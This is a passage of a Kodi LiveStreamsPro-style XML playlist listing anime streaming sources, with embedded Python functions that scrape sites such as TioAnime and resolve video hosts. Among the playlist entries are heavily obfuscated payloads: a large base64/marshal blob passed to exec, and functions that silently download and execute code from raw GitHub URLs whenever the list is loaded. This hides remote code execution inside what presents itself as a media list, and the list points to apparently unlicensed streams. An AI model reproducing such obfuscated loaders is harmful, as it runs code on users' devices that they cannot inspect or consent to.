VWd6UVVkRWJVRkhWM3BCVkZZeVFWRkliVUZIV20xQmQwZ3lRVWQ0TTBKSFJETmFiVm93VEVkTmRrRjNVakJNYlVnMFFWRndNVXhIUkRKQmJWWXlURzFNTVZwdFRERkNVWEJ0V20xV00wRkhURFJCZDBnd1RFZHdNRUZSVERKQmQweHRRVkZJTUUxM1RHMUJkMW94V2tkTmVWcHRSRE5hZDNGMVFXMXdNMEpIVjNwQlNsSXpRbEZFTlVGSFNHMWFkMGcwUVhwTU1VSlJXbXRCYlhneVduZEVORUYzZUcxYWJVaHNRWHBTTTFwM1JESkJNbEl4V2xGSU1rRjZWbTFhYlV3MFdtMU1NMXB0V2pKQlVYZ3lRbEZ3TkZwNlRESk1SMFY1UVZGU01VRkhUR3RCZDBnd1RVZE5lVUZSY0RCTVIwUTFRWGRJTVVGSFRETmFiVkp0V25kTU5VRkhVakJCYlhBMFFWUkVNMEZIVjNaQmQxb3dRWGRJTTBGSFRETkNVWEEwUVhwV2JVSkhSR3RCZWxadFFVZGFiRUYzZERKTmQzQTFRVlJJTUVGSGNHeEJVWEF5UWxGd01FRnRlREZDUjFvd1FYZHdNMXAzV2pGQlVVUXdRVkZhYkVGdGVETkJVVnBxUVZGMGJVRnRXalJCVVVReVFWRndOVUYzZUROYWQwaHRRWGRNYkUxM1NHMUJVVVF5VFVkRWJVRjZTRzFhYlVWNldtMVNNRUpSY0cxQlZFaHRRVzFGZVVGNlJETmFiVTE2UVhkU2JVSkhjRzFCUjB3d1duZHdORUYzVmpOQ1VVVjVXbTE0YlZwM1dqRkJVVWd3V25kd2JFRlJTREphYlVnelFXMVNNVUYzV210QlZFd3hXa2RNYlVGdGVERkNSMDE1UVZGYU1reEhXbXhCVVV3eldrZHdNbHB0ZUROTVIwUXpRVzFJYlVGM1JHeGFla3d6V25kTU0wRjNVbXhOZDAxNFFVZElNVUpSVEd0QlNsSnNUSGRKZFVGNlJESmFkMHcxUVhkME1FMUhjR3hCYlhnd1FVZGFNRUZ0Y0d4TmQzQXdRWGRTTWt4SGNEVkJkM2d3UWtad1FWQjZaM2x5U2pGMWJqSkpiRlpSTUhSWE0zUnRUWHAwWlhCS1V6Tk1NMkkxY1dGUFNYQXdZbVZ2TTJJelJIcGliVzU0Y1V0Q1NFRnVSVEpKZUc4ellqTkNTa2swV2t0MWVrZFJVMUZ2VUdac1RFZFBXVVl5T1dsd1NrbGhSbnBtTTBZd1RWWkVNblF4Y0hkVFdVaEhUbVZJVkZOUFFrdDVTVWh0UVdwdVUxZEpRa1puTW05S05VRkNSMWRHU0VneGEwa3dlVnBKU21JMWIzb3dNMFYzUVhoS1MzRnFRa3BUUjFrd1VtVkVlWEZxU0RKNVlVMUhRVXR1VVZkNmIzcDVZMFZTWjBkdU0yTTJRVEoxTmtGU1ZqUk1Na1ZyUVVkV2JYQkxZMFp3TTNGRGIwaEpNWEI2UVZCQ1VYRmhUREpOVjBsNlFURnZNbU5ZVEhveGFVRlJRVlZGUm1kRFdrZFhTRWg1UldkdU1EVjFTVWxGU25BeWVUSkNSbWROVFcxQk1VeHRTV3RhWVZkNWNFWTVWMFI1Y1daSVZFRkJjSGc1WlVKU01URk5NamxTUkVkT01XOTZVbVZ2VkZOamJ6SnJOa1J0ZEROd1NHdE1TVXQwYlc0eVUxaEdNa2xrUmt0Sk0yNTNUR3hDVkdOUGNWRlhWVXhMVm1wS1lYRkNXak5qWlZwUlNWQkllVkkxY0VsNVRWa3ljVUZ1TVVsQlJWVnhSVVJJY1RaTlVWTlRTVEJYVFhCSVoyMXlVWEZyYjBoNE5FMHhUVVphTW5sa1dETkJaVm95T1dsTVMweHFXak5YYVc0eVFXdHdkMFZHUWtvNWVtNTZPVTFOYlhGUmNXMU5SSEI0VTBSS1NsZExXbEo0TW5BeVkwcHZWR0l4UlhkT2JVMHpTV1Z1U2xkaFdraEpZVmx0VjJkTVMwZ3hSVWhJTVc4emVVeEpTR2N4VEVseGFVZEtPVzF3ZDNRMVRIZFBaVmd5TldGd00wRkhSRE5CUTBZd09WcElVVTh5YjBseFdWZ3lSR3h1TTFOUVJFb3hia2xLUlZkTmJVbFhXV3huU25KaFUwUkdkMDVsU2tsNGEwVjZjVFpCTWxOUVJERlNhMjkyWjBWR1Ntb3hSbTFGWkZvd1lqTnVNM1F6VEVneGVYRlVlRFJhTVZOWGIwZE5aVUpIV20xeE1EZ3ljRXROYUV4aFNXMXhiVVZoUm5oYU1FRXdWbXRGWVV3eGIxTjFaM0I0WW14RmQwNDFia281WkVGNk1USnlSMDlYUWtkVFdVZFNSREZ2U0hodFRURlhXWEo1ZERORVNqQnJRVE5OVEZrd2NXaHVWRk5MUWtkQmFFRXlkVlZ4UzNGdFFUSXhZVTEzZVhaSFIwbE1SbEpxYkVKVWRHdEJZVTlMYmxSalIwMUpVM1p2TWtGM2NuaGlhVTB3VERSRU0xSTFXVEJCYVVaNFdqTnhTalZQY2t0WE5rUktVMGhLZDNWNVNVbzVWRmd3UVRGd1lXTnRSVWx4VTNCSGNYcENTVmRhU25kNVNrWjZkVTFOTURFMlJURkpaRWN3WmpKd1ZFRjZTRzFCWWtoR09XTkhlREZCUVV0UFZWcDNUMU5OVW5CcFJ6SkJkVnBVZERKQk1tWnRSakI1WjB4dFFVWkViRGxqYjJGUFRVaEhkREZITVU5aWNYcE5kMFJKU0RGTVNFVmlXbmhCVTFwR09VdHlZWGw0VFcxWFlrRjZlV3hGTVVsSVFYcEJZMFF3WjJodlNYRjZjVkZCTUc1UmNXaGFNR3BsVEVkVFZFaFZZMDl1VTFvMFIwdE1NMjVVVTJWQlMxZG9jRW94VUc1VFRWQnZiVUZRY2xKbWEyOXRRV3RKTW5WV1FWUnFiSEJUVFZCeGVubDVXbFIxU0UxVFNYZENVM0ZUY1VkRlpHOHllV3B2UjNRMWIwbzVaMFl6U1ZkYWVXTXdXREptTWxodGRXRndlbXRWUWt0MVdVbHNPRFZKZVZOalFYcDFZVUpUVFdSdWJYazBSM3B4VTBkVWEycEpNRGxaUkVwNWFHOWhVMk5CU0VRMVJUSjFTVnBMWWpOdlZYVjVSVVptYW5CNVkyeHZNM1ZSU1ZGVFkwaDZRV1p3ZDNWdWNIcDRha3hMVnpWTmQzRnNURE5qYlVreVJWSkdWREY1U1ZSamJVVklZM1p5UjBsSWNXMU5TVzlIVnpaRVMwbG9SRXBYWm5GVFZqTkJNREZQVFcxTk1VRXlVMUp1TTFjd1dHdzVhRUpJWTAxQlVYRk5SWGcxZGxsdGNWbEJNMWQxUWxKVFJVaEpZMUZhZDBrMmIzaG1NMDFMZEd4QmJWcHRSWHB3YTB4NWVXZEhNa2hzUVZSVFYwVktlR1ZNUzFkWlNVcEliRVZWVnpKSU0wOXRSa2RQVjBGS1FVUkpiR2Q0UWxORmFGb3dNVE53ZVVsNmIwaDVNa0pWU1VSTmJYRkliMGRNTTBGS2RXaEpWVTluV1RCRmJrRXpkVlJLVTNsRFRVbEpVVWhKVjJWRk1VMXNRVEpFYkc1TFRHeElTazFGY1hsMGEwUklWalZOUjNWc1RIbGpaRnBRWnpGWU1qbDNURXBUUWtsaFJERkVNbXBzY0hweE1IRjZTVnBHTWpsaFNuaHJZVVY2UlV4dk1tWnNRVXBUU0VWTFFUUkJWRmRsU0ROQmRscFJWbXhFZUVFelNsSnJTWEJ0Y1ZkRWRtZEhXbmd4ZG5CNlRXbHVZVk51Y0ZWSU1rWXpUVWx1TVhsRFdsRlhiRzVVZVROeWVuZ3pTWHA1UlUweFRYcGFNMDFTY1VwMU1rMVJjRE5KTVhsVVJESXhVMFV4VERSdWVsTklSVWhYVFVGSFJXSnZZVmRYUVZKMVdYRmhZMHR1VUdkdGNEQlhVMHhLVjJ0TmVqVnNXVzE1TmtWSFZqUnZkMDlYUlZGWGVrWlFaekp2ZDAxTFdUQjRNa0ZTYXpKWk1FMWpUVXQ1WTNGSVl6TkpTa2xRVEhwMVJGb3plVzF4WVZOcVdub3hka0ZVYW1WSVNVbEZRVzFUV2xwdFV6RlliVUYyU0VkRlJrMUtTRFJLZDNsYVJETmpaWEJ0Y1VWdmQzVlZjbmxKWTNKNVFYaENWWFJ0UjBwbU5YQXpUVFpJVWtsWVRXRkZTMjl0VTNkR1lVaHJXREpUZUc5SGRHVlpNRll3U2twNWQwaDRWMGh1U0RFMVNESmFNRTE0UVdwS2RqaGxUWGRYWW5KS1UyTnlVbkZRV20xT00zSjNUVWRJTTBGcGNrcGpiVWRTVEcxRk1YQnRUWHBuUTFodFRHeHZVbkZsU0V0Qk1tOVJXbXh2TVVGcVRXMVBTRWt5TlhkTlNGTjNUVEJUTUZnelFYVnVNa2xqV2xKSlZHNHdRWGx3ZUZOU2J6SjVZMEZWUVdwd2VXTTFTSHBqYlVSNFNESkhTblZCYjNoblozSkdaM3B4VVZOUGNsSkZWVVZLUVhkRk1tZEZRbEpJYW04eGVXaEZTakZJV1RCV01Fd3dSRzF5ZDFOVGNGRkJNbTVIY0d4SFIwMXJXa2hhTWtGNmRXSktTRk5wYmtwclFYSlFPV2hHTUdJMVJESkJZa2RJYWpCYVZIQnFXa294TlVkVFkyRnZValJsUkhablVFUXlURE5OZDNsSlNsRlNaVWRIZVhkdk1uUXpiMVI1VDB3elZqTkdiVmN4U2tkSWFuQXplVXRDVkZOdWNGVlBVRWRJTUd4eE1qRnNRVW93TUVWU2EzaHdWRWxFUmpCbldtNUhlREZ1U1VodFFraFhSMDFTWmpWQmVHdHJTVXBJTW5FemVWSkdTbU5QU2toaWJWb3pWMmR5ZDNrelJrdE1hVVo0WTBGSFMySTFXbmhuWlhKNFkxWkZSM2xFYmpGWFVYQmhWMUJ3U0VWTlFUTldiVVJJT1ZCd1IzUnNSREoxU0hGaFFYcEZTREY0V0cxV2JWcExVMkZIU0ZOcWNIcFhZbkF5WjFWRU1YQXhjRE5KZGxwaGNVaHdVMXBwV20xeFluQmhSVzFNZG1kUldrdDRaVVozVjFCSGVrbEtjWHAxYlZnelUyTnlTbWRqVFZRNVkzSkxWMjVOZDAxNVRUQm5Ta3BWVTB4YVNEazFRWGwxUmxwSVFXeENTRk5RY2tkME1VeDVlRFJCTWtsYWNrcE1ORWxIUVdOSmQwOTFjWHBuWmtReWEyRklVMUp0U0VoV00wSktRVE5CTUVScmNVcGlOWEZVWTFwd1MzbExjbmg1TVUweWRXMU5SMHhwYmtoSWEwMUhRVE5LZW5sMVJsRndNazE1VTBSeVNsWXpibEZXTlVwTFdqRk1TalZRUWxSMVRYRnRjVFJ5ZW5salNXRmlhbHB0UVdOTmQzRTBjWGhuYkc5dFRUQkVNakV6U1habVpYQlZTWGhOTTBsUFFrZE1aVWhKUlZkeE1VbGtUREl4ZDBFelFUTnZlR05xUVV0TlpGa3pSVlpNZVhRd2JucGFNVVZKVDAxTU0xTkZXa3ByZDBaNmRWRnhTVm95VFRKTldVcFVPV2R1U1hocVRXRlBOWEJ0UVRWQmQxcHBjWGxKU25FeFYwRkJVakYxY1hsSlkyOVVWbXh2VkRGUFIwbFdNVXA2T1V0SmVIRnRTSHBpYlV4SFREUnZTMWN6UnpKcmRreEtjVUZOWVU5blRVdDVaVTE2UVd4SE1FRXlUVE5YUjBGaGNWTk5lblZuVFZKQlkwZEtlV0p5UjNWTWNEQmpNRUYzVW1wdmVXTXlTbEpCWjNCS09VMUlTMEZwUjFOeFkwVXlSREpIYlVGWlRERnhaMXBMVFcxTVMwd3hSSHBOTTNCSWFteHdVM2hsU2xSQmVrcGhlV0pCZDBWaVJWRlBkVnBoVGpOYWVscHJRa3BOWjBoS2RWcHVlakY2Um5wNVpFcDNSVTFZTUVReldqRkZUVUZWWTFwSFNFRkZiekExTUVGdFFYVmFlbE5qY1VwV05FRlVPR2xHTUZZemNUTk9hVUZJTVcxSU1tZFpjSGRCTmtsSWNVVnZlSEZpUlcxME1YSlZZMjV3ZWpCcGNEQklhMGd6VjBaYWJEazFiek5QWTBWVFRtbE1lakY0VFVoU01rRjRUV1Z3ZVhsRlNuZHhXVWRLZFRKdVMzRmlTa3RYYUVGSFFXMVlNRTEyUjIxeFlVY3dTWFpKVkRFMFNIcE5iVWxTVjFGYU0yTjFSVkpqVlVaaFR6WnhVbU5YUjFGSWEyOTNRVmxhZG1kNVNURmpUVzkzZERSSVIwbHFSVlF3YlVwaFJERkpTVWxuU1VvMVJYQjVSV2RFYlVWc1IxRldha2xMVjFoSlVVUnRjRE5KYlVwNFREVk5NREExU0ZGYWFXNUhTVVZLU1hWWWIxVlRaWEF4UldoeVNrMXNUVWQ1WkVGSGVHdHZZVWcxV0ROeE5FUjNUV3h3ZDFjMFJVdDRORzh3TlhwQ1NVMUhRbFZhTVhKVFQyeHllSEZZY0dGQk1HOTZTREJ1VkdOb1JqTk1iRWhWVjJOSVZWWnNjVzFOWm05VVFXdE5TazFSY1VoRmEwZFJlV3hNZDBGcFNrZFhkVTFoZFdWQ1NHWnNTSHBuUjBZeVlqVkNVazFSU2xKWE1rMVRlVlJhTVVScFJUQTVha1l4VFRWSlIzRnRSakl4WjFveFJVaEtlR05DY0VkSU1FaEhRV1ZNU0hWNlFsRjBNVWN4Y0ROSVMwbDZRa2w0YVVKUU9XMU5kMDlKUkVwcmJIQXdTREZZYlhWbldUSkVNbkJoWTJSd00wRnRXVzF4ZFhCNVRYVk1TMU4yUVRKVFptOUplVEZ3ZUVGaVJqQnhTRTFSZVVGdVNXTlJRVzFCVUZneWNUVkpTM0EwUmtwaU5GcEdPWHBhTURCdFdqTk9NRWRMUlZwSE1uRlhSMjF4YkUxNldtbE1NakZGUVZONE0waDNUbWxDU0hGVFRVaEJRa0Z0ZFZaeVZYUnBSMHBKWjI1R09UTllNRkp0VFhod00xcEpZMnh4VkZkM1RIcHJSMWx0Y1dsSlMzaGxRWG8xVkVkVlYxVkJNblF3VFVoYU1HOTJPVzFNYkRrMmNsVjFlVWxHT1ZGQ1ZYQXdjVzFCYm5KaFdtVkJNWGxNUkRCRWFVRkhVMFJaTUdabFJYcDViVVpSZURKR2JEZ3lSWHBOVjBaSFRVUndiWGxuYmtoQlIwcEtRV0p3TTNGaldESnhVMjlJY0dsSFNqVlRUVlI0TlhFemNWRktTbmh0VEVkV2JFWlVNV3RKVWtGbVdUSjVhVzkyT1ZOTVlYQnJSVEowYWtWS05UTlpNM1UwVEVneFdFMHlVbXhKUmpsWlFXRndaVVIyT1dsSFNsSTFXREkxWlhKVll6WnVlamhyY2xSRlNFRlZVMnB3ZVhreGJqTkJTMFJzWjFGd2VrbFVXbFJ3TkhKVVUwbENVR2RwVEhoNWEwWnNaMUZ2TWpsaFRFcHFhVWN5U1hwRU0yTnRUVXBGWWxveU9HcHdWVmRMUVdGQlNrWlVTV1J3TUVGRlJVZDFNbTlMZEdsTlNGTkpUVzF3WlUxVVltcHllRnByU0VkeE5GcEhlV0ZZTTFkcFdsRndhM0pJY1U5Q1IwNXNTbEZXTlhGc1pqSlpNREYzY0VwRk0weExTR2xJVTA1dFFYb3dhVzVUWW1sd1UyTmFjRlF3TTNCVVNXZEJTMUpwUVhZNGFYQkdaMGR1UmpnMFRIZHhVVnBoVWpWQmVIUTBjR0ZCTWtkR1oyTnVNbWRoV0RCQldVRXljVTFaYkdkdVNYaE1ORmt5ZURCd1MwUXlTa2Q1ZVZnd1FXcEViRGx1V2pKbmFWbHRUVUZ3YkdkNlJFZHhiWEJHT0dWd2QxTnRXVzFCVUVGU1YxSmFSamsyUmxGQlJWZ3hkV1pKVTBsdFdXMXhhMWx0ZUd0eE1FRkhjVE4xTkVjeGNYcENVMU50Y0ZWQmQwWlJXbVZKU0hGTVNrdDFibGt5U0cxWmJEbGpXa2Q1U0hKNVkzcFpNbmxqUlhkYWEwcFFaakpFUjNsTmNrbHhaMWhzT0RCTmJVOU5RVlZCWTBVd1RHVllNVUZvU2tZNU5WaHNaMjVGZWpsNVdUTmlNVVZHT0dsSFZIVlVUSGw1WkZwSGNXMXlTbXBwUkdGQmQxbHRSRE5DU1Vnd2NIaG1iSEJSZFROWk1tSnBSMHRhYVVGVmVHMVpNVUZwY1VwNWJYQnNPR1ZHUzFwcGJsRmFiVmxzT1RWYWJVRTJjbEJtYVc5Mk9XMVpiR1p0V2pCcWJVSlVURFJ3UjFwcFJ6TjRhVVF6VTNWTWR6QmhVVVJqTm01S09XaFdVVEIwVnpGck5FRnRWM0J5VVUxNlMxVjBNMEZUYXpSYWJWTndjbEZhYlZkcU1GaHZla2xwVmxFd2RFMUxUWFZ2VUhSaFMxVjBNbHA1YXpSQmQzbHdjbEZOZVV0VmRESmFTV3MwUVcxQmNISlJURzFMVlhReVFrbHJORUYzZVhCeVVWZDVTMVYwTTBGSmF6UkJla2x3Y2xGTU5FdFZkREpCU1dzMFFXMTFjSEpSVFhkTFZYUXlRa2xyTkVGM1RYQnlVWEExUzFWMGJFSlRhelJCZWtWd2NsRk5la3RWZEROYWVXczBRVzFQY0hKUlREUkxWWFF5UVVsck5FRnRTWEJ5VVhCdFMxVjBiRUpKYXpSYWQwNWhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRETmFNV3MwV25wSmNISlJUREJMVlhReVFVbHJORUYzUVhCeVVVMTZTMVYwTWtGVGF6UkJkMGx3Y2xGV05FdFZkRE5CVTJzMFFXMVhjSEpSVERWTFZYUXlUVWxyTkVGM2VYQnlVWEF3UzFWME0wSkphelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUms1bFZsUkpNa3hLYW1KWE1XczBRWGRYY0hKUlREVkxWWFF5VFVsck5FRjNVM0J5VVhCdFMxVjBNbG94YXpSQmQzbHdjbEZNTlV0VmRHeE5TV3MwUVcxSmNISlJUWGxMVlhReVFsTnJORUYzU1hCeVVYQTBTMVYwTWt3eGF6UkJkM2x3Y2xGTU1rdFZkRE5DU1dzMFduZDFjSEpSVFhwTFZYUXpXbmxyTkVGM1UzQnlVVXh0UzFWME1rd3hhelJCZDBsd2NsRldOVmRzZUhSWWJFOTVjWHBUWmxoUWNYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZERKYU1XczBRVzFCY0hKUlYzbExWWFF5UVZOck5FRjNTWEJ5VVV4dFMxVjBNazE1YXpSQmQwVndjbEZNTVV0VmRHeENVMnMwUVhwWGNISlJUREZMVlhRelFrbHJORUY2UlhCeVVVeHJTMVYwTWt4NWF6UkJkMGx3Y2xGd2JFdFZkR3hhVTJzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFUXdXRTFMVFhWdlVIVjNiekl4YW01S2EzbFlWV05tYmtwV2FFMVVTWGR2TWpGcWNIcEpiWEJzZFhaTVMwRjVRWGRFYUV4M1REQk5WRWwzYnpKRmVWaFVTVEpNU21waVZ6RnJORUY2U1hCeVVVd3hTMVYwTWsxMmNHTllSbmhtVjIxcmJYRlZWMk52ZW5BclYyeHFZVTFMZFhsTWJIQmpXRVE5UFhRRkFBQUFjbTkwTVROekNRQUFBRzF2Y25Cb1pYVnpJSE1jQUFBQVkyOWtaV056TG1SbFkyOWtaU2gwY21sdWFYUjVMQ0I2YVc5dUtYUUdBQUFBYjNKaFkyeGxjeDRBQUFCamIyUmxZM011WkdWamIyUmxLR3RsZVcxaGEyVnlJQ3dnZW1sdmJpbDBBd0FBQUc1bGIzTUlBQUFBUEhOMGNtbHVaejUwQkFBQUFHVjRaV01vQ3dBQUFIUUdBQUFBWW1GelpUWTBkQVlBQUFCamIyUmxZM04wQ0FBQUFHMXZjbkJvWlhWemRBY0FBQUIwY21sdWFYUjVVZ1FBQUFCMENBQUFBR3RsZVcxaGEyVnlkQVFBQUFCNmFXOXVkQVFBQUFCbGRtRnNVZ1VBQUFCMEJ3QUFBR052YlhCcGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/wGo8Q8O.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
</item>




<item> 
<title>[COLOR orange]ANIME FLV [COLOR white]Web[/COLOR]</title> 
<externallink>https://pastebin.com/raw/jaMXCkvu$$LSProEncKey= $$</externallink> 
<link>na</link> 
<thumbnail>https://i.imgur.com/ajGm4a1.jpg</thumbnail>
<fanart>https://i.imgur.com/SKvCy0e.jpg</fanart>
</item>




<item>
<title>[COLOR orange]TIOANIME [COLOR white]Web[/COLOR]</title> 
<link>$doregex[makelist1]</link>
 
<regex>
<name>makelist1</name>
<listrepeat><![CDATA[
<title>[B][COLOR white] [makelist1.param3][/B][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>https://tioanime.com[makelist1.param2]</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)class="anime".*?href="/anime/(.*?)".*?src="(.*?)".*?title">(.*?)<]]></expres>
<page>https://tioanime.com/directorio?q=$doregex[search]</page>
</regex>
 
<regex>
<name>search</name>
<expres><![CDATA[#$pyFunction
import xbmc
import xbmcaddon
import xbmcgui
def GetLSProData(page_data,Cookie_Jar,m):
    dialog = xbmcgui.Dialog()
    d = dialog.input('Buscar Anime: ', type=xbmcgui.INPUT_ALPHANUM).replace(" ", "+")
    return d
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
 
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[B][COLOR white][makelist2.param1]  Episodio:  [makelist2.param2][/B][/COLOR]</title>
  <link>$doregex[j63]</link>
<thumbnail>https://i.imgur.com/O4mRkWp.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
    <info></info>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re
def GetLSProData(page_data,Cookie_Jar,m):
  return re.findall('info.*?,".*?".*?"(.*?)".*\s+var\sepisodes\s=\s\[|(\d+)[\,\]]',re.findall('<script>\s+var anime(?s)(.*?)episodesList',page_data)[0])
]]></expres>
<page>https://tioanime.com/anime/[makelist1.param1]</page>
<cookieJar></cookieJar>
</regex>
 
<regex>
<name>j63</name>
<listrepeat><![CDATA[
<title>[B][COLOR white][j63.param1][/COLOR][/B]</title>
  <link>$doregex[j63Url]</link>
<thumbnail>https://i.imgur.com/O4mRkWp.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(Fembed|Okru|YourUpload|Verystream|Rapidvideo|Maru)","(https:\\/\\/.*?)"]]></expres>
<page>https://tioanime.com/ver/[makelist1.param1]-[makelist2.param2]</page>
<referer>https://tioanime.com/anime/[makelist1.param1]</referer>
<cookieJar></cookieJar>
</regex>
<regex>
    <name>url2</name>
    <expres>$pyFunction:'[j63.param2]'.replace('\/','/')</expres>
    <page/>
</regex>

<regex>
<name>j63Url</name>
<expres><![CDATA[#$pyFunction
import re,urlresolver
def GetLSProData(page_data,Cookie_Jar,m):
  return urlresolver.resolve('$doregex[url2]')
]]></expres>
<page></page>
</regex>
  <thumbnail>https://i.imgur.com/O4mRkWp.jpg</thumbnail>
<fanart>https://i.imgur.com/Ifecd8c.jpg</fanart>
</item>
 
